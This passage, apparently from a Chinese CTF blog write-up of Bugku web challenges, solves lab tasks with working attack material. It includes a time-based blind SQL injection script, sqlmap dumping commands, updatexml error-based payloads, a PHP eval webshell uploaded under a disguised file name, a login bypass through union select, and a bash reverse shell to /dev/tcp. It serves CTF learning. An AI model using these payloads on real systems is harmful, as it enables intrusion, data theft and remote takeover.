class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>明确注入点，是走的http报头的x-forwarded-for。</p>
<p>我尝试了bool型注入，发现自己构造的语句在自己数据库中会报错，但是这里并没有错误报告，因此考虑基于时间的盲注</p>
<p>我之前时间延迟盲注都是用 if(exp1,exp2,epx3) 这种格式来完成的，但是这里的一段代码，相当于把 “,” 给过滤了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br></pre></td></tr></table></figure>

<p>于是改变方法，用 case when exp1 then sleep(4) else 1 end 来绕过 “,”的限制</p>
<p>exp1 中要用到substr来进行剪切，这个函数substr(str,1,1) 又是存在 “,” , 于是这里我又用 substr (str) from 1 for 1 来绕过 “,”的限制</p>
<p>又拼接的语句为value(‘ 输入的内容 ‘)，最后的poc为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (case when (length((select database())) &#x3D; 14) then sleep(4) else 1 end) #</span><br><span class="line"></span><br><span class="line">1&#39; and (case when (substr(select database())  from 1 for 1)&#x3D;&#39;c&#39; then sleep(4) else 1 end) #</span><br></pre></td></tr></table></figure>

<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into client_ip (ip) values (&#39;  1&#39; and (case when (length((select database())) &#x3D; 14) then sleep(4) else 1 end) --  &#39;)</span><br></pre></td></tr></table></figure>

<p>Python脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"># 基于时间的盲注，过滤了逗号 ,</span><br><span class="line">sql &#x3D; &quot;127.0.0.1&#39;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)&#x3D;&#39;&#123;1&#125;&#39; then sleep(5) else 0 end))-- +&quot;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1, 40):</span><br><span class="line">    print(&#39;正在猜测：&#39;, str(i))</span><br><span class="line">    for ch in range(32, 129):</span><br><span class="line">        if ch &#x3D;&#x3D; 128:</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        sqli &#x3D; sql.format(i, chr(ch))</span><br><span class="line">        # print(sqli)</span><br><span class="line">        header &#x3D; &#123;</span><br><span class="line">            &#39;X-Forwarded-For&#39;: sqli</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            html &#x3D; requests.get(url, headers&#x3D;header, timeout&#x3D;3)</span><br><span class="line">        except:</span><br><span class="line">            flag +&#x3D; chr(ch)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>最终得出结果是MD5值，解密就ok</p>
<h4 id="这是一个神奇的登录框"><a href="#这是一个神奇的登录框" class="headerlink" title="这是一个神奇的登录框"></a>这是一个神奇的登录框</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614095950785.png" alt="image-20200614095950785"></p>
<p>查看源码</p>
<p>是post提交，url明显提示是个sql注入，由于post提交，要sql和burp结合起来使用。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115515525.png" alt="image-20200614115515525"></p>
<p>首先burp抓包，抓到包后选择存到txt文件中：（随便输入账号密码）</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115612664.png" alt="image-20200614115612664"></p>
<p>我保存到了D盘的1.txt里。</p>
<p>然后打开sqlmap，输入指令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -p admin_name --dbs</code></p>
<p>解释一下 -r是读文件 后面是刚才保存的绝对路径，-p是参数，也就是注入点（选了admin_name是注入点） –dbs意思是想获取数据库名字</p>
<p>可以看到sqlmap获得了数据库的名字：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115646317.png" alt="image-20200614115646317"></p>
<p>应该是这个bugkul1，再继续爆表，命令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -p admin_name --tables</code></p>
<p>解释：-D是表示选择了后面的这个数据库 –tables是想获取表</p>
<p>可以看到爆出了表：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115709079.png" alt="image-20200614115709079"></p>
<p>应该在flag1这个表里，继续爆列名：</p>
<p>命令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -T flag1 -p admin_name --columns</code></p>
<p>解释类似上面 不过加了一个-T 指定表</p>
<p>可以发现爆出了列名：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115723998.png" alt="image-20200614115723998"></p>
<p>flag1这个列 最后查字段 命令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump</code>解释：同上面 –dump是获取字段的命令（在这过程中可能会让你选择Y或者N 我直接回车的）可以看到爆出了flag：<br><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115746599.png" alt="image-20200614115746599"></p>
<h4 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614140048911.png" alt="image-20200614140048911"></p>
<p>查看原始页面</p>
<p>可以看到URL有一个 ?id=1，一看到这个第一时间想到的就是注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614140649361.png" alt="image-20200614140649361"></p>
<p>测试一下看看是不是</p>
<p>使用万能单引号，发现页面返回错误，说明存在SQL注入。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141003167.png" alt="image-20200614141003167"></p>
<p>使用注释符，查看页面返回，发现使用<code>#</code>还是返回错误，说明可能是<code>#</code>这个注释符被过滤了，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141056433.png" alt="image-20200614141056433"></p>
<p>使用一下<code>--+</code>或者<code>%23</code>试试，页面返回正常。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141154522.png" alt="image-20200614141154522"></p>
<p>查看字段数</p>
<p>发现order by 都已经等于1了还是返回错误，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141234690.png" alt="image-20200614141234690"></p>
<p>使用1’ or 1=1 –+ 看看页面返回，发现or被过滤了，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141512044.png" alt="image-20200614141512044"></p>
<p>使用双写试试，页面返回正常说明可以双写绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141540958.png" alt="image-20200614141540958"></p>
<p>因为不知道那些被过滤了，所以测试一下and试试</p>
<p>and也出错了，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141623783.png" alt="image-20200614141623783"></p>
<p>将and进行双写，发现页面返回正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141658004.png" alt="image-20200614141658004"></p>
<p>这次知道了or 和 and被过滤了，将or双写查看字段数</p>
<p>当字段为2的时候返回正常，3的时候页面返回错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141851898.png" alt="image-20200614141851898"></p>
<p>查看注入点，嗯？报错了，经过测试发现union select也被过滤了，也要进行双写绕过一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141937056.png" alt="image-20200614141937056"></p>
<p>双写绕过，注入点是2</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142045859.png" alt="image-20200614142045859"></p>
<p>查看数据库，当前数据库为<code>web1002-1</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142116577.png" alt="image-20200614142116577"></p>
<p>查看表，不要忘记information中的or双写，可以看到获得的表为<code>flag1</code>和<code>hint</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142231685.png" alt="image-20200614142231685"></p>
<p>查看flag1表中的内容，获得<code>flag1</code>and<code>address</code>这两个字段</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142336341.png" alt="image-20200614142336341"></p>
<p>查看flag1这个字段，或得内容<code>usOwycTju+FTUUzXosjr</code>，这个数据提交是错误的，所以我们试试address字段</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142432801.png" alt="image-20200614142432801"></p>
<p>查看address字段内容</p>
<p>可以看到出现了一个下一关的地址，点击。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142552844.png" alt="image-20200614142552844"></p>
<p>进去之后发现还有一个注入。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142639683.png" alt="image-20200614142639683"></p>
<p>在使用单引号</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142758306.png" alt="image-20200614142758306"></p>
<p>加注释符</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142816295.png" alt="image-20200614142816295"></p>
<p>查看字段</p>
<p>字段为2的时候返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142841780.png" alt="image-20200614142841780"></p>
<p>查看注入点，把union过滤了，双写，大写小编码等 都不能绕过，因为有报错信息，那就用报错注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143008009.png" alt="image-20200614143008009"></p>
<p>查看数据库</p>
<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</code></p>
<p>当前数据库为<code>web1002-2</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143304362.png" alt="image-20200614143304362"></p>
<p>查看表</p>
<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;web1002-2&#39;),0x7e),1) --+</code></p>
<p>当前表名： ‘<del>class   ,   flag2</del>‘</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143619524.png" alt="image-20200614143619524"></p>
<p>查看flag2表中的字段</p>
<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#39;flag2&#39;),0x7e),1) --+</code></p>
<p>当前字段： ‘<del>flag2      ,    address</del>‘</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143746058.png" alt="image-20200614143746058"></p>
<p>查看flag2字段内容</p>
<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(flag2)from flag2),0x7e),1) --+</code></p>
<p>flag{Bugku-sql_6s-2i-4t-bug}</p>
<p>将B改为b因为题目要求小写，如果大写提交的话会提示错误</p>
<p>flag{bugku-sql_6s-2i-4t-bug}</p>
<p>复制提交就ok</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143904307.png" alt="image-20200614143904307"></p>
<h4 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155227949.png" alt="image-20200614155227949"></p>
<p>原始页面，什么也没有，查看源码看一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155308120.png" alt="image-20200614155308120"></p>
<p>F12查看源码，可以看到一个upload.php，访问这个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155405448.png" alt="image-20200614155405448"></p>
<p>可以看到是上传文件的，这里一看加上文件名就知道这里是文件上传漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155520631.png" alt="image-20200614155520631"></p>
<p>构造一句话木马，这里不能使用普通的一句话<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code>这个payload被过滤了，所以就要构造一个不被过滤的payload</p>
<p>payload：<code>&lt;?php &lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;cmd&#39;]) &lt;/script&gt; ?&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160404812.png" alt="image-20200614160404812"></p>
<p>复制payload，然后将文件后缀改为例：1.php;.jpg</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160104254.png" alt="image-20200614160104254"></p>
<p>上传，访问红线处的内容，查看页面是否返回空白，页面只有访问的时候是空白的时候才能使用蚁剑或者菜刀连接成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160510438.png" alt="image-20200614160510438"></p>
<p>复制链接，这里我使用的是蚁剑，使用蚁剑连接</p>
<p>先添加数据，将URL粘贴上，密码就是一句话中POST里面的自己设置的值，测试连接后左下角出现成功就点击添加</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160546779.png" alt="image-20200614160546779"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160700151.png" alt="image-20200614160700151"></p>
<p>双击进入，可以看到这个最长的，他的文件名也非常像flag，双击进去查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160724363.png" alt="image-20200614160724363"></p>
<p>发现flag确实在里面，复制提交就oK</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160809061.png" alt="image-20200614160809061"></p>
<p>还有一种方法将一句话构造成</p>
<p><code>&lt;?php &lt;script language=&#39;php&#39;&gt;system(&#39;ls&#39;)&lt;/script&gt; ?&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161500776.png" alt="image-20200614161500776"></p>
<p>还是将文件名改为1.php;.jpg</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161529154.png" alt="image-20200614161529154"></p>
<p>提交之后返回路径，复制访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161547711.png" alt="image-20200614161547711"></p>
<p>可以看到this_is_th3_F14g_154f65sd4g35f4d6f43.txt显示出来了，复制进行访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161620030.png" alt="image-20200614161620030"></p>
<p>访问this_is_th3_F14g_154f65sd4g35f4d6f43.txt文件夹</p>
<p>成功返回falg</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161658497.png" alt="image-20200614161658497"></p>
<h4 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200230005.png" alt="image-20200614200230005"></p>
<p>查看原始页面</p>
<p>这里提交数据点击login是没有反应的，开始的时候题目给了提示hint，尝试给hint传参</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200300804.png" alt="image-20200614200300804"></p>
<p>给hint随机传参，都会返回源码，分析源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200354802.png" alt="image-20200614200354802"></p>
<p>源码</p>
<p>这里的$KEY是没有赋值的，不管最底下的$KEY，因为没有赋值说明当前$KEY为NULL，因为前面有unserialize函数进行反序列化，所以这是反序列化之后的值为NULL，也就是当ISecer全等于$KEY的时候返回flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line"># cookie等于ISecer</span><br><span class="line">$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];</span><br><span class="line"></span><br><span class="line"># 判断hint不能为空</span><br><span class="line">if(isset($_GET[&#39;hint&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 判断cookie也就是ISecer是否等于$KEY,等于输出flag</span><br><span class="line">elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>用在线php测试一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200945836.png" alt="image-20200614200945836"></p>
<p>复制上面的结果，然后因为之前ISecer是cookie的所以要再cookie中进行输入</p>
<p>使用burp抓包发送到repeater模块进行修改，然后运行，成功返回flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614201100734.png" alt="image-20200614201100734"></p>
<p>这里不嫩将cookie和上面回车空开一行，否则不出flag</p>
<p>例如：</p>
<p>以为cookie和上面回车空了一行所以断开了，没有执行cookie就结束了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614201150159.png" alt="image-20200614201150159"></p>
<h4 id="sql注入-2"><a href="#sql注入-2" class="headerlink" title="sql注入 2"></a>sql注入 2</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214134741.png" alt="image-20200528214134741"></p>
<p>原始页面，发现是登录界面，我们使用常用的弱口令试试能否登上，使用burp抓包一下，看看哪个是</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214112354.png" alt="image-20200528214112354"></p>
<p>抓包后非常绝望，发现除了admin其他都是一样的，我们除了admin挨个尝试一下试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214307661.png" alt="image-20200528214307661"></p>
<p>使用admin123，Wc，居然对了，登录进去了。。。。</p>
<p>可以看到输入框有个ls … 我们照着输入一下试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214350284.png" alt="image-20200528214350284"></p>
<p>输出后居然返回了flag。纯属蒙的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214512096.png" alt="image-20200528214512096"></p>
<p>手注</p>
<p>大佬的解题思路：<a href="https://blog.csdn.net/Mikasa_/article/details/87475337" target="_blank" rel="noopener">https://blog.csdn.net/Mikasa_/article/details/87475337</a></p>
<p>还有一个也是瞎猜出来的，就是在URL上输入flag会直接跳转页面，显示flag值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528220725088.png" alt="image-20200528220725088"></p>
<h4 id="孙XX的博客"><a href="#孙XX的博客" class="headerlink" title="孙XX的博客"></a>孙XX的博客</h4><h5 id="不会"><a href="#不会" class="headerlink" title="不会"></a>不会</h5><h4 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104358427.png" alt="image-20200615104358427"></p>
<p>查看原网址</p>
<p>这里注册也没有用，所以用御剑扫一下看看有没有有用的地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104501313.png" alt="image-20200615104501313"></p>
<p>可以看到扫到了一个show.php的地址，双击打开后发现flag就在里面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104638188.png" alt="image-20200615104638188"></p>
<p>复制提交就ok</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104715542.png" alt="image-20200615104715542"></p>
<h4 id="Bugku-CTF-login2-SKCTF"><a href="#Bugku-CTF-login2-SKCTF" class="headerlink" title="Bugku CTF login2(SKCTF)"></a>Bugku CTF login2(SKCTF)</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145248163.png" alt="image-20200615145248163"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145405953.png" alt="image-20200615145405953"></p>
<p>使用burp抓包发送到repeater模块运行，</p>
<p>可以看到有一串base64加密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145504301.png" alt="image-20200615145504301"></p>
<p>解密得到以下值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT username,password FROM admin WHERE username&#x3D;&#39;&quot;.$username.&quot;&#39;&quot;;</span><br><span class="line"></span><br><span class="line">if (!empty($row) &amp;&amp; $row[&#39;password&#39;]&#x3D;&#x3D;&#x3D;md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码中的单双引号的嵌套，其中username和password列名在数据库中是存字符串的，而字符串是需要用引号引起来的，不然会出错，这个时候最外面的双引号是具有解析变量的作用，而里面的单引号是给数据库语句用的，如果里面再用双引号就会跟最外面的双引号起冲突了，故用单引号。</p>
<p>这告诉我们要登录要满足的条件：查询结果不为空，其次，输入的password的值要等于md5(password)。</p>
<p>例：<code>username=adminadsadaw&#39; union select 1,md5(1)#&amp;password=1</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155619788.png" alt="image-20200615155619788"></p>
<p>这样就能用后台数据库中并不存在的密码来绕过并登录成功：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155557851.png" alt="image-20200615155557851"></p>
<p>下面进入一个命令执行的页面：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155646518.png" alt="image-20200615155646518"></p>
<p>采用的反弹shell来做的。</p>
<p>反弹shell需要有公网ip，我们假设有个公网ip192.168.10.130，不用公网ip的话就线下赛局域网做题也行。</p>
<p>输入bash -i &gt;&amp; /dev/tcp/192.168.10.130/8888 0&gt;&amp;1并执行，然后在kali上运行命令：nc -lvp 8888，就能进行连接了，找到flag文件就拿到flag了。<br>原文链接：<a href="https://blog.csdn.net/zz_Caleb/java/article/details/89054600" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/java/article/details/89054600</a></p>
<h4 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h4><p>具体步骤在这个网址：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80667775" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80667775</a></p>
<h5 id="文件上传2（湖湘杯）"><a href="#文件上传2（湖湘杯）" class="headerlink" title="文件上传2（湖湘杯）"></a>文件上传2（湖湘杯）</h5><h5 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头"></a>江湖魔头</h5><h5 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h5><h4 id="Web进阶"><a href="#Web进阶" class="headerlink" title="Web进阶"></a>Web进阶</h4><h5 id="phpcmsV9"><a href="#phpcmsV9" class="headerlink" title="phpcmsV9"></a>phpcmsV9</h5><p>打开页面，从字面意思上就可以看出，这是要进行后台扫描。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172809843.png" alt="image-20200715172809843"></p>
<p>可能是我卡的原因，页面显示不全，这并无大碍</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172848323.png" alt="image-20200715172848323"></p>
<p>使用dirsearch进行目录扫描。</p>
<p><code>python3 dirsearch -u http://123.206.87.240:8001/ -e php</code></p>
<p>其中扫描出rebots.txt，其中1.php是返回phpinfo。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172926781.png" alt="image-20200715172926781"></p>
<p>在url后打开robots.txt。可以看到flag就在其中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715173106341.png" alt="image-20200715173106341"></p>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><h5 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h5><p>源码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag=<span class="string">'xxx'</span>;</span></span><br><span class="line"><span class="meta">extract($</span><span class="bash">_GET); </span></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">shiyan)) &#123; <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>)); <span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>) &#123;</span></span><br><span class="line">echo'flag&#123;xxx&#125;';</span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">echo'Oh.no';</span><br><span class="line">&#125; </span><br><span class="line">&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>白话代码：<br>一个名叫flag的变量等于‘xxx’<br>将通过GET传过来的数组转为一个名为数组名，值为数组值的变量(如果新的变量和已有变量重名，会将已有变量替换)<br>如果存在一个名叫shiyan的字符串<br>将flag变量的值赋给名为content变量<br>如果变量shiyan和变量content的值相同，<br>就输出flag的值<br>否则就输出Oh,no<br>因为extract()会把符号表中已存在的变量名的值替换掉，所以制造Payload ：?shiyan=&amp;flag=<br>也就是利用新传入的值为空的flag替换原有的flag的值。构造空等于空，成功输出flag的值</p>
